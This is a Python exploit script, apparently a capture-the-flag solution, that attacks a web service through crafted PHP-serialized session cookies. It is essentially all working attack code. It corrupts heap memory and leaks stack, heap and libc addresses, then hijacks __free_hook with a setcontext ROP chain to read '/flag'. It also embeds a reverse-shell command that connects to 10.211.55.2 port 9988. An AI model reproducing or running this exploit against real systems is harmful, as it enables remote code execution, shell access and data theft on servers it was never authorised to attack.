import requests
import logging
from pwn import *

def dec_char(data):
    out = ''
    i = 0
    while i < len(data):
       cc = ord(data[i])
       if cc < 0x80:
           out += chr(cc)
       elif i == len(data) - 1:
           break
       elif cc == 0xc2:
           x = ord(data[i + 1])
           i += 1
           assert 0x80 <= x <= 0xbf
           out += chr(x - 0x80 + 0x80)
       elif cc == 0xc3:
           x = ord(data[i + 1])
           i += 1
           assert 0x80 <= x <= 0xbf
           out += chr(x - 0x80 + 0xc0)

       i += 1

    return out
context.arch= "amd64"
url = sys.argv[1]
logging.basicConfig(level=logging.DEBUG)
s = requests.Session()
k = p64(0) + p64(0x2e1) + p64(0) +'a'*0x18 +p64(0)  +p64(0x41) + 'b'*(0x118-0x20+0x1a8) 
d = 'c'*0xc0
x = """a:2:{i:50216;s:%d:"%s";i:56746;r:2;}""" % (len(k),k)
x = x.encode('base64').replace('\n', '')
h = {
    'Cookie': 'session=%s;' % x
}
d = p64(0) + 'c'*0x28
y = 'a'*0x100
x2 = """a:2:{i:456;i:789;s:%d:"%s";i:123;}""" % (len(d),d)
x2 = x2.encode('base64').replace('\n', '')
h2 = {
    'Cookie': 'session=%s;' % x2
}




r = s.get('http://{}:47793/info'.format(url), headers=h)

r  = s.get('http://{}:47793/info'.format(url), headers=h2)
data= r.content
data = data.split(p64(4))[-1]
stack =  u64(dec_char(data).split("\"")[0][-8:])
print "stack:",hex(stack)
heap =u64(dec_char(data[:16])[:8]) -0x1530
print "heap:", hex(heap)
target = heap + 0x1130
d = p64(target) + 'x'*0x8 + p64(0) + p64(0x41) + p64(0) + 'b'*8
x3 = """a:2:{i:456;s:%d:"%s";s:%d:"%s"}""" % (len(d),d,len(d),d)
x3 = x3.encode('base64').replace('\n', '')
h3 = {
    'Cookie': 'session=%s;' % x3
}
r  = s.get('http://{}:47793/info'.format(url), headers=h3)

target = heap+0x1150

d = p64(target) + 'y'*0x28
target2 = 0x4141414141
leakptr = heap+0xf310
fuck ="a"*0x10+  p64(target2) + p64(0x31) + p64(0) + p64(0x51)+ p64(0x4) + p64(leakptr)+ p64(0x30) + p64(0x31)+'a'*0x20 + p64(0) + p64(0x21)+'a'*(0xb0+0x1b0)
x4 = """a:2:{s:%d:"%s";s:%d:"%s";i:1337;s:%d:"%s";}""" % (len(d),d,len(d),d,len(fuck),fuck)
x4 = x4.encode('base64').replace('\n', '')
h4 = {
    'Cookie': 'session=%s;' % x4
}



r  = s.get('http://{}:47793/info'.format(url), headers=h4)
leakdata = r.content.split("string(48) ")[1]
libc = u64((dec_char(leakdata)[0x55:0x55+8])) - 0x3ebca0
print "libc:",hex(libc)

free_hook = libc + 0x3ed8e8
ret_addr = stack - 0x87a
ret = libc + 0x52100
rsp = free_hook + 0x40
d = p64(0) + 'c'*0x28
f = 'a'*0x10 + p64(free_hook) + p64(0)*7 + p64(rsp) + p64(ret)  + 'a'*8
f = f.ljust(0x2e8,'z')
t =  "bash -c 'bash>&/dev/tcp/10.211.55.2/9988 0>&1'\x00".ljust(0x2d0,'a')
system = libc + 0x4f440
magic = libc +0x4f322
system = 0xdeadbeef
setcontext = libc + 0x520a5

oopen = libc + 0x61ace0
read  = libc + 0x61a340
write = libc + 0x61a270
pop_rdi = libc + 0x000000000002155f
pop_rsi = libc + 0x0000000000023e6a
pop_rdx = libc + 0x0000000000001b96
flag_path = "/flag"
flag = free_hook+8
outfd = 1
exit = libc + 0x43120
rop = flat([pop_rdi,flag,oopen,pop_rdi,3,pop_rsi,heap+0x100,pop_rdx,0x80,read,pop_rdi,outfd,pop_rsi,heap+0x100,pop_rdx,0x80,write,exit])
x = p64(setcontext) + flag_path.ljust(0x38,"\x00") + rop
x = x.ljust(0x2d0,'x')
x5 = """a:3:{i:456;s:%d:"%s";i:386;s:%d:"%s";s:%d:"%s";s:%d:"%s";}""" % (len(d),d,len(f),f,len(t),t,len(x),x)
x5 = x5.encode('base64').replace('\n', '')
h5 = {
    'Cookie': 'session=%s;' % x5
}
r  = s.get('http://{}:47793/info'.format(url), headers=h5)
